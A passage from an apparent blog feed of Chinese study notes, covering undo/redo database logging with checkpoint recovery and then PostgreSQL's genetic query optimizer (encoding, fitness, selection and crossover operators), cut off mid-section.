tabindex="-1">（3）检查点及其使用</h4><p>检查点</p><ul><li>静止检查点：周期性地对日志设置检查点<ul><li>停止接受新的事务，等到所有当前活跃事务提交或终止，并在日志中写入COMMIT或ABORT记录后</li><li>将日志刷新到磁盘，写入日志记录&lt;CKPT&gt;,并再次刷新日志</li></ul></li><li>非静止检查点<ul><li>在设置检查点时不必关闭系统，允许新事务进入</li><li>在写入一条&lt;CKPT(T1,…Tk)&gt;（其中T1，…Tk）是所有活跃的未结束的事务</li><li>继续正常的操作，直到T1…T_k完成时，写入&lt;END CKPT&gt;</li></ul></li></ul><p>恢复时恢复到第一个检查点的位置，即恢复到第一个&lt;END CKPT&gt;或&lt;CKPT&gt;的位置</p><h3 id="2305-redo%E5%9E%8B%E6%97%A5%E5%BF%97%E5%8F%8A%E5%85%B6%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D" tabindex="-1">2305 Redo型日志及其故障恢复</h3><h4 id="%EF%BC%881%EF%BC%89redo%E5%9E%8B%E6%97%A5%E5%BF%97%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E8%A7%84%E5%88%99" tabindex="-1">（1）Redo型日志的日志记录规则</h4><ul><li><p>Undo型日志的问题“将事务改变的所有数据写入磁盘前不能提交该事务”<br>Redo型日志记录信息：</p></li><li><p>对于任一事务T，按下列顺序向磁盘输出T的日志信息</p><ul><li>首先 T,x,v被写入到日志中</li><li>其次，COMMIT T被写到日志中</li><li>最后，OUTPUT(X)</li></ul></li><li><p>注意：redo型日志保留新值，T,x,v，v为更新后的值</p></li><li><p>与undo型的差别，往后两步，先写提交记录输出，还是先输出再写提交记录</p></li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8redo%E6%97%A5%E5%BF%97%E8%BF%9B%E8%A1%8C%E6%81%A2%E5%A4%8D" tabindex="-1">（2）利用redo日志进行恢复</h4><ul><li>首先，确定每一个事务是否已经完成<ul><li>start T,commit T = yes</li><li>start T,abort T = no（已结束，但未完成）</li><li>start T… = no</li></ul></li><li>从日志的起始位置开始按日志记录的正序处理每一日志记录，重做已经提交事务的所有修改<ul><li>commit t：标记t已经完成</li><li>abort t：标记t已结束但未完成</li><li>t，x，v：如果t已经完成，则将x=v写回磁盘，否则跳过</li><li>start t：跳过</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E6%A3%80%E6%9F%A5%E7%82%B9%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8" tabindex="-1">（3）检查点及其应用</h4><ul><li><p>静态检查点（同Undo）</p></li><li><p>非静态检查点</p><ul><li>再进行检查点设置时不必关闭系统，允许新事务进入</li><li>写入一条 start ckpt(t1,…tk)，其中t1,…tk是所有活跃的未结束的事务</li><li>将所有已提交的事务写回磁盘</li><li>继续正常的操作，直到t1,…tk都完成时，写入end ckpt</li></ul></li><li><p>step1：寻找到最后的end ckpt</p></li><li><p>step2：从start ckpt里的事务的最早开始处开始恢复，忽略更早的提交事务</p></li></ul><h3 id="2306-undo%2Fredo%E7%BB%93%E5%90%88%E5%9E%8B%E6%97%A5%E5%BF%97%E5%8F%8A%E5%85%B6%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D" tabindex="-1">2306 Undo/Redo结合型日志及其故障恢复</h3><h4 id="%EF%BC%881%EF%BC%89%E5%8D%95%E7%A7%8D%E6%97%A5%E5%BF%97%E7%9A%84%E9%97%AE%E9%A2%98" tabindex="-1">（1）单种日志的问题</h4><ul><li>Undo型日志<ul><li>OUTPUT必须先做</li><li>如果 COMMIT T 可见，T确定地已经将所有其数据写回磁盘，因此不必重做</li><li>但可能引起性能下降（因为频繁的写磁盘）</li></ul></li><li>Redo型日志<ul><li>OUTPUT必须后做</li><li>如果 COMMIT T不可见，T确定地没有将任何数据写回到磁盘，因此无需撤销</li><li>但灵活性差，数据必须在COMMIT后才可见</li></ul></li><li>更好地—Undo/Redo 型日志</li></ul><h4 id="%EF%BC%882%EF%BC%89undo%2Fredo%E7%BB%93%E5%90%88%E5%9E%8B%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E8%A7%84%E5%88%99" tabindex="-1">（2）Undo/Redo结合型日志记录规则</h4><ul><li>对于任一事务T，按下列顺序向磁盘输出T的日志信息<ul><li>第一步，&lt;T,X,u,v&gt;被写到磁盘中</li><li>第二步，COMMIT T 或 OUTPUT T 都可以</li></ul></li><li>Undo/Redo结合型日志既保留新值v，也有旧值u。</li></ul><h4 id="%EF%BC%883%EF%BC%89undo%2Fredo%E7%BB%93%E5%90%88%E5%9E%8B%E6%97%A5%E5%BF%97%E8%BF%9B%E8%A1%8C%E6%81%A2%E5%A4%8D" tabindex="-1">（3）Undo/Redo结合型日志进行恢复</h4><ul><li>自前向后地，按日志记录的正序，重做所有已经提交的事务；</li><li>自后向前地，按日志记录地反序，撤销所有未完成事务地修改</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css"></索引字段值Ki，指针Pi></li>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库试验--PostgreSQL源码分析--遗传算法的使用</title>
      <link href="/2023/08/16/%E6%9C%AC%E7%A7%91/%E6%95%B0%E6%8D%AE%E5%BA%93PostgreSQL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2023/08/16/%E6%9C%AC%E7%A7%91/%E6%95%B0%E6%8D%AE%E5%BA%93PostgreSQL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><img src="/images/meitu/5.jpg"><p><a href="https://github.com/postgres/postgres.git">源码地址</a></p><h2 id="1-postgresql%E7%9A%84%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84" tabindex="-1">1 PostgreSQL的体系结构</h2><p>PostgreSQL数据库由连接管理系统(系统控制器)、编译执行系统、存储管理系统、事务系统、系统表五大部分组成</p><ul><li>连接管理系统接受外部操作对系统的请求，对操作请求进行预处理和分发，起系统逻辑控制作用</li><li>编译执行系统由查询编译器、查询执行器组成，完成操作请求在数据库中的分析处理和转化工作，最终实现物理存储介质中数据的操作</li><li>存储管理系统由索引管理器、内存管理器、外存管理器组成，负责存储和管理物理数据，提供对编译查询系统的支持;</li><li>事务系统囱事务管理器、日志管理器、并发控制、锁管理器组成，日志管理器和事务管理器完成对操作请求处理的事务一致性支持，锁管理器和并发控制提供对并发访问数据的一致性支持</li><li>系统表是 PostgreSQL 数据库的元信息管理中心，包括数据库对象信息和数据库管理控制信息,系统表管理元数据信息，将 PostgreSQL 数据库的各个模块有机地连接在一起，形成个高效的数据管理系统。</li></ul><h2 id="2-postgresql%E7%9A%84%E6%9F%A5%E8%AF%A2%E7%BC%96%E8%AF%91%E9%98%B6%E6%AE%B5%E4%B8%AD%E7%9A%84%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95" tabindex="-1">2 PostgreSQL的查询编译阶段中的遗传算法</h2><p>查询处理器是数据库管理系统中的一个部件集合，它允许用户使用 SQL 语言在较高层次上表达查询，其主要职责是将用户的各种命令转化成数据库上的操作序列并执行。查询处理分查询编译和查询执行两个阶段。</p><p>当PostgreSQL 的后台服务进程接收到查询语句后，首先将其传递到查询分析模块，进行词法、语法和语义分析 若是简单的命令(例如建表、创建用户、备份等)则将其分配到功能性命令处理模块;</p><p>对于复杂的命令( SELECT/INSERT/DELETEl UPDA四)则要为其构建查询树( Query 结构体) .然后交给查询重写模块。查询重写模块接收到查询树后，按照该查询所涉及的规则和视图对查询树进行重写，生成新的查询树。</p><p>生成路径模块依据重写过的查询树，考虑关系的访问方式、连接方式和连接顺序等问题，采用动态规划算法或遗传算法，生成最优的表连接路径 最后，由最优路径生成可执行的计划，并将其传递到查询执行模块执行。</p><p>因此PG中的遗传算法的使用主要在生成最优的表链接路径上</p><h2 id="3-%E6%9F%A5%E8%AF%A2%E8%A7%84%E5%88%92%E7%9A%84%E6%80%BB%E4%BD%93%E6%B5%81%E7%A8%8B" tabindex="-1">3 查询规划的总体流程</h2><p>查询规划的最终目的是得到可被执行器执行的最优计划，整个过程可分为预处理、生成路径和生成计划三个阶段。</p><ul><li>预处理实际上是对查询树( Query 结构体)的进一步改造，这种改造可通过 SQL语句体现。在此过程中，最重要的是提升子链接和提升子查询。</li><li>在生成路径阶段，接收到改造后的查询树后，采用动态规划算法或遗传算法，生成最优连接路径和候选的路径链表。</li><li>在生成计划阶段，用得到的最优路径 首先生成基本计划树，然后添加 GROUPBY HAVING ORDER BY 子句所对应的计划节点形成 整计划树</li></ul><h2 id="4-%E8%B7%AF%E5%BE%84%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95" tabindex="-1">4 路径生成算法</h2><p>路径代表了对一个表或者多个表中数据的访问方式。</p><p>由于单个表的访问方式(顺序访问、索引访问)、两个表间的连接方式(嵌套循环连接、归并连接、 Hash 连接)以及多个表间的连接顺序(左连接、右连接和布希连接)都有多种，因此访问 表或多个袤的路径也会有多种，</p><p>每个路径都可能是上述访问方式、连接方式和连接顺序的一种组合。查询执行模块只需要执行效率最高的路径。因此在准备计划时，查询规划器需要考虑所有的路径，并从中挑选出最优的路径来生成执行计划，这个生成并挑选最优路径的工作由路径生成算法完成</p><p>PostgreSQL 中有两种路径生成算法:动态规划算法和遗传算法。</p><p>动态规划算法是生成路径的默认算法，但在某些情况下，检查一个查询所有可能的路径会花去很多的时间和内存空间，特别是所要执行的查询涉及大量的关系的时候。在这种情况下，为了在合理的时间里判断一个合理的执行计划， PostgreSQ 将使用遗传算法生成路径。</p><p>是否启用遗传算法由两个因素决定:</p><ul><li>在系统配置中是否允许使用遗传算法：由全局变量enable_geqo控制，其值来自于配置文件中的 geqo 配置项，默认情况下是允许。</li><li>需要连接的基本关系是否超过使用遗传算法的阈值：由全局变量geqo_threshold 控制，其值来自于配置文件中的geqo_threshold配置选项，<br>默认值是 12 ，即参加连续的基本关系数大于或等于 12 时就会采用遗传算法来生成路径</li></ul><h2 id="5-%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E6%A6%82%E8%BF%B0" tabindex="-1">5 遗传算法概述</h2><p>遗传算法 (GA) 是一种种启发式的优化方法 (heuristic optimization method) ，它通过既定的随机搜索进行操作。</p><p>优化问题的可能解的集合被认为是个体(individuals)组成的种群(population).一个个体对它的环境的适应程度由它的适应值(fitness) 。一个个体在搜索空间里的参照物是用染色体(chromosomes)表示的,实际上这是一套字符串。一个基因(gene)是染色体的一个片段，基因是被优化的单个参数的编码。对一个基因的典型的编码 以是二进制 (binary)或整数(integer)。通过仿真进化过程的重组(recombination)、变异(mutation) 和选择(selection )找到新一代的搜索点，它们的平均适应值要比它们的祖先好。</p><p>在PostgreSQL中，遗传算法将路径作为个体，将个体以某种方式编码(个体体现了连接顺序),然后通过重组得到后代，考虑连接代价来计算后代的适应值，再选择合适的后代进行下一次迭代。当到达一定的迭代次数之后，遗传算法终止。选择遗传算法可以减少生成路径的时间，但是遗传算法并不一定能找到&quot;最好&quot;的规划，它只能找到相对较优的路径。</p><h2 id="6-postgresql%E4%B8%AD%E7%9A%84%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95" tabindex="-1">6 PostgreSQL中的遗传算法</h2><p>PostgreSQ 中，遗传算法主要用在连接路径的生成操作中，其流程如下：</p><p><img src="/images/%E6%9C%AC%E7%A7%91/PostgreSQL/GA_process.jpg" alt="GA_process"></p><h3 id="%EF%BC%881%EF%BC%89%E4%B8%AA%E4%BD%93%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F%E5%8F%8A%E7%A7%8D%E7%BE%A4%E5%88%9D%E5%A7%8B%E5%8C%96" tabindex="-1">（1）个体编码方式及种群初始化</h3><p>PG中用遗传算法解决表连接的问题的方式类似于TSP问题。可能的连接路径被当作整数串进行编码。v每个穿代表查询中的一种可能的连接顺序。</p><p>如下图的查询书可以用整数串<code>&quot;4132&quot;</code>编码,即首先连接表&quot;4&quot;和&quot;1&quot; 得到的结果表再和表 “3” 连接，最后再和&quot;2&quot; 连接。</p><p><img src="/images/%E6%9C%AC%E7%A7%91/PostgreSQL/%E6%9F%A5%E8%AF%A2%E6%A0%911.jpg" alt="查询树"></p><p>遗传算法执行第一步为随机初始化种群。假设种群大小为n，首先随机初始化n个排列树，每一个排列数即是一个个体。然后基于n各排列数生成的基本表的连接路径，在此过程中进行代价评估，将最后的代价作为适应值衡量该个体的优劣。</p><p>每一个个体都用Chromosome结构表示，记录了个体的排列和代价</p><pre><code class="language-c">typedef int Gene;typedef struct Chromosome&#123;    Gene *string;//染色体的数据值    Cost worth;//对染色体的代价评估&#125;//Chromosome</code></pre><h3 id="%EF%BC%882%EF%BC%89%E9%80%82%E5%BA%94%E5%80%BC" tabindex="-1">（2）适应值</h3><p>个体的适应值等于该个体中N个表的连接代价。适应值计算由geqo_eval实现，包括以下步骤：</p><ol><li>检查个体的有效性</li><li>确定个体的连接次序以及连接方式</li><li>计算个体的适应值</li></ol><p>计算个体的适应值时.首先要检查个体是否有效。也就是说，对一个给定的个体，能不能把这个个体中的表按照某种次序连接起来，因为有些表之间是不能连接的。如果一个个体按任何次序都不能连接，那么这么个体是无效的。对于有效的个体，还要确定连续次序和连接方式。在连接次序和连接方式确定之后才能计算个体的</p><h3 id="%EF%BC%883%EF%BC%89%E7%88%B6%E4%BD%93%E9%80%89%E6%8B%A9%E7%AD%96%E7%95%A5" tabindex="-1">（3）父体选择策略</h3><p>附体选择策略是基于排名的选择策略，选择概率函数如下公式。<br>其中max是个体总数，bias默认值是2.0，geo_rand是0.0~1.0之间的随机数，f(geo_rand)表示当前个体在种群中的编号（该编号是根据当前个体的适应值在种群中的排名来确定）。<br>该函数表明，排名越前的个体被选择的概率越大。</p><section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>g</mi><mi>e</mi><mi>o</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="right center left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo>∗</mo><mfrac><mrow><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>−</mo><mi>A</mi></mrow><mrow><mn>2</mn><mo>∗</mo><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>A</mi><mo>&lt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo>∗</mo><mfrac><mrow><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>−</mo><msqrt><mi>A</mi></msqrt></mrow><mrow><mn>2</mn><mo>∗</mo><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>A</mi><mo>≥</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>其中</mtext><mo separator="true">,</mo><mi>A</mi><mo>=</mo><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>∗</mo><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>−</mo><mn>4</mn><mo>∗</mo><mo stretchy="false">(</mo><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mi>g</mi><mi>e</mi><mi>o</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex"> f(geo\_rand)=\left\{\begin{array}{rcl}max*\frac{bias-A}{2*bias-1}&amp;&amp; {A&lt;0}\\max*\frac{bias-\sqrt{A}}{2*bias-1}&amp;&amp; {A\geq 0}\\其中,A=bias*bias-4*(bias-1)*geo\_rand\end{array} \right. </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">eo</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.9334em;vertical-align:-1.7167em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-2.5em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.492em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.016em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.016em" style="width:0.8889em" viewbox="0 0 888.89 16" preserveaspectratio="xMinYMin"><path d="M384 0 H504 V16 H384z M384 0 H504 V16 H384z"/></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.016em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.016em" style="width:0.8889em" viewbox="0 0 888.89 16" preserveaspectratio="xMinYMin"><path d="M384 0 H504 V16 H384z M384 0 H504 V16 H384z"/></svg></span></span><span style="top:-4.3em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.2167em;"><span style="top:-4.3832em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">bia</span><span class="mord mathnormal mtight">s</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">bia</span><span class="mord mathnormal mtight">s</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4033em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-2.9332em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0466em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">bia</span><span class="mord mathnormal mtight">s</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">bia</span><span class="mord mathnormal mtight">s</span><span class="mbin mtight">−</span><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9323em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight" style="padding-left:0.833em;"><span class="mord mathnormal mtight">A</span></span></span><span style="top:-2.8923em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1077em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4033em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-1.6899em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"><span class="mord cjk_fallback">其中</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">bia</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">bia</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal">bia</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">eo</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.7167em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.2167em;"><span style="top:-4.3832em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"></span></span><span style="top:-2.9332em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5167em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.2167em;"><span style="top:-4.3832em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span><span style="top:-2.9332em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5167em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></eqn></section><h3 id="%EF%BC%884%EF%BC%89%E6%9D%82%E4%BA%A4%E7%AE%97%E5%AD%90" tabindex="-1">（4）杂交算子</h3><p>PostgreSQL 中的遗传算法提供 边重组杂交、部分匹配杂交、循环杂交、基于位置的杂交和顺序杂交等多种杂交算子，用于从父辈种群中产生新的后代个体，默认使用的是边重组杂交算法</p><h4 id="a-%E8%BE%B9%E9%87%8D%E7%BB%84%E6%9D%82%E4%BA%A4" tabindex="-1">a 边重组杂交</h4><p>边重组杂交算子自函数gimme_edge_table和gimme_tour实现。函数 gimme_edge_table 用来计算边关系;函数 gimme_tour由边关系得到后代。<br>边重组杂交过程如下：</p><ol><li>两个父体中的基因构成循环队列<br><img src="/images/%E6%9C%AC%E7%A7%91/PostgreSQL/GA_ERX.jpg" alt="查询树"></li><li>确定父体间的边关系<br>在步骤1中的循环队列中，任意一个基因和相邻的基因构成“边关系”。如果某“边关系”同时在父体1和父体2中出现，则称为“共享边”。</li><li>由边关系得到后代<br>边重组杂交的基本思想是:随机地选择一个基因作为起始点，顺着它的边关系找到下一<br>个基因(优先考虑共享边) ，再顺着找到的基因的边关系找到第三个基因，直到找到的基因能够构成一个个体为止，最后将找到的基因按找到的顺序组成一个个体即可。</li></ol><h4 id="b-%E9%83%A8%E5%88%86%E5%8C%B9%E9%85%8D%E6%9D%82%E4%BA%A4" tabindex="-1">b 部分匹配杂交</h4><p>由函数pmx实现，该函数流程如下：</p><ol><li>在字串上均匀随机地选择两点，由这两点确定的子串称为映射段，定义两个整型变量left和right(left&lt; right) 表示选取的映射段的起始边界。</li><li>用父体2的映射段替换父体1的映射段产生原始后代。</li><li>确定两映射段之间的映射关系</li><li>根据映射关系将后代合法化</li></ol><h4 id="c-%E5%BE%AA%E7%8E%AF%E6%9D%82%E4%BA%A4" tabindex="-1">c 循环杂交</h4><p>循环杂交算子由函数 cx 实现，该方法从一个双亲中取一些基因，而其他的基因则取自另外一个双亲。</p><p>该方法首先随机确定一个初始位置，作为当前位置，把父体1当前位置下的基因(即编<br>号)赋值给当前位置下的子代，并标记此基因已被使用 然后推进当前位置到父体2当前位置(未修改前的位置)下的基因在父体1中的位置，同样把父体1当前位置下的基因赋值给当前位置下的子代。<br>同理推进当前位置，生成子代的基因片段，直到循环到初始位置下父体1的基因与父体2中的当前位置下的基因一样时循环结束。如果循环结束后仍有部分基因没有被使用，则将父体2中的这些基因按在父体2中存在的位置赋值到子代中同样位置。</p><h4 id="d-%E5%9F%BA%E4%BA%8E%E4%BD%8D%E7%BD%AE%E7%9A%84%E6%9D%82%E4%BA%A4" tabindex="-1">d 基于位置的杂交</h4><p>基于位置的杂交算子由函数 px 实现，该函数的处理流程如下:</p><ol><li>根据基因数目 gene ，首先随机选择一个区间[gene/3 , 2/3 * gene ]中的整数p,从父体1中随机选择p个基因，设为集合A</li><li>对于在A中的基因，从父体1拷贝到后代中对应的位置上。</li><li>不在A中的基因，按它们在父体2中的顺序拷贝到后代剩余的位置上。</li></ol><h4 id="e-%E9%A1%BA%E5%BA%8F%E6%9D%82%E4%BA%A4ox1" tabindex="-1">e 顺序杂交ox1</h4><p>顺序杂交算子有两种：OX1和OX1。OX1算子由函数 ox1 实现，函数 oxl 的处理流程如下:</p><ol><li>从第一个父体中随机选择一个子串。</li><li>将子串复制到一个空串的相应位置，产生一个原始后代。</li><li>删去第二个父体中子串已有的基因，得到原始后代需要的其他基因的顺序。</li><li>按照这个基因顺序，从左到右将这些基因复制到后代的空缺位置上。</li></ol><h4 id="f-%E9%A1%BA%E5%BA%8F%E6%9D%82%E4%BA%A4ox2" tabindex="-1">f 顺序杂交ox2</h4><p>OX2 